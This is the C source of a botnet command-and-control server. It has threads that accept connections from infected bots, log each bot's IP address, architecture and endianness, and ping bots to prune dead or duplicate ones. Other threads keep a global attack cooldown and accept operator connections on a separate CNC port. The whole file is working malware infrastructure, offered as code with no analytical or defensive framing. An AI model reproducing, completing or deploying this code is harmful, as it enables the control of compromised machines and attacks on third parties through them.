#include "headers/botnet.h"
#include "headers/user_handler.h"
#include "headers/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

Bot bots[MAX_BOTS];
int bot_count = 0;
int global_cooldown = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;

void* handle_bot(void* arg) {
    int bot_socket = *((int*)arg);
    free(arg);
    char buffer[MAX_COMMAND_LENGTH] = {0};
    ssize_t len;
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;
        buffer[len] = 0;
        int valid = 1;
        for (ssize_t i = 0; i < len; i++) {
            if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
                valid = 0;
                break;
            }
        }
        if (!valid) break;
    }
    close(bot_socket);
    return NULL;
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (bot_server_socket < 0) return NULL;
    int optval = 1;
    setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    struct sockaddr_in bot_server_addr;
    memset(&bot_server_addr, 0, sizeof(bot_server_addr));
    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);
    if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
        close(bot_server_socket);
        return NULL;
    }
    listen(bot_server_socket, MAX_BOTS);
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *bot_socket = malloc(sizeof(int));
        if (!bot_socket) continue;
        *bot_socket = accept(bot_server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*bot_socket < 0) {
            free(bot_socket);
            continue;
        }
        pthread_mutex_lock(&bot_mutex);
        if (bot_count < MAX_BOTS) {
            bots[bot_count].socket = *bot_socket;
            bots[bot_count].address = client_addr;
            bots[bot_count].is_valid = 1;
            char archbuf[20] = {0};
            ssize_t archlen = recv(*bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
            if (archlen > 0) {
                archbuf[archlen] = 0;
                strncpy(bots[bot_count].arch, archbuf, sizeof(bots[bot_count].arch)-1);
            } else {
                strcpy(bots[bot_count].arch, "unknown");
            }
            char ipbuf[32];
            inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
            const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
            int already_logged = 0;
            for (int i = 0; i < bot_count; i++) {
                char existing_ip[32];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, existing_ip, sizeof(existing_ip));
                if (strcmp(existing_ip, ipbuf) == 0) {
                    already_logged = 1;
                    break;
                }
            }
            if (!already_logged) {
                char logarch[128];
                snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture : %s", endian, bots[bot_count].arch);
                log_bot_join(logarch, ipbuf);
            }
            bot_count++;
        } else {
            close(*bot_socket);
            free(bot_socket);
            pthread_mutex_unlock(&bot_mutex);
            continue;
        }
        pthread_mutex_unlock(&bot_mutex);
        pthread_t bot_thread;
        pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
        pthread_detach(bot_thread);
    }
    close(bot_server_socket);
    return NULL;
}

void* ping_bots(void* arg) {
    while (1) {
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            for (int j = i + 1; j < bot_count; j++) {
                if (!bots[j].is_valid) continue;
                if (bots[i].address.sin_addr.s_addr == bots[j].address.sin_addr.s_addr) {
                    close(bots[i].socket);
                    bots[i].is_valid = 0;
                    break;
                }
            }
        }

        int current_pos = 0;
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL);
                if (res < 0) {
                    close(bots[i].socket);
                    bots[i].is_valid = 0;
                } else {
                    if (current_pos != i) {
                        bots[current_pos] = bots[i];
                    }
                    current_pos++;
                }
            }
        }
        
        bot_count = current_pos;
        pthread_mutex_unlock(&bot_mutex);
        sleep(10);
    }
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            global_cooldown--;
        }
        pthread_mutex_unlock(&cooldown_mutex);
        sleep(1);
    }
    return NULL;
}

void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) return NULL;
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cncport);
    int optval = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(server_socket);
        return NULL;
    }
    listen(server_socket, 16);
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *client_socket = malloc(sizeof(int));
        if (!client_socket) continue;
        *client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*client_socket < 0) {
            free(client_socket);
            continue;
        }
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, client_socket);
        pthread_detach(client_thread);
    }
    close(server_socket);
    return NULL;
}